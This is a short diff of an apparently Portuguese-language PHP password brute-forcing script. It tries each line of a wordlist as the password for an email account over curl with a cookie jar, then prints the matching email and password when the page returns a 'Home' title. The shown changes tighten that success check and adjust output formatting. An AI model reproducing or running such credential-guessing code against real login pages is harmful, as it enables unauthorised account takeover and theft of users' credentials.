@@ -45,7 +45,7 @@ print"--------------------------------------------------------------------\n";
 		curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
 		$source = curl_exec($ch);
 		curl_close($ch);
-		if(eregi("Home", $source)){
+		if(eregi("Home</title>", $source)){
 			return true;
 
 		}else{
@@ -65,6 +65,7 @@ print"--------------------------------------------------------------------\n";
 		$line = str_replace("\r", "", $line);
 		$line = str_replace("\n", "", $line);
 		if(brute($email, $line)){
+			print "\n";
 			print"--------------------------------------------------------------------\n";
 			print "\n";
 			print "	[+] Email: ".$email. " Senha: ".$line. 		   "\n";
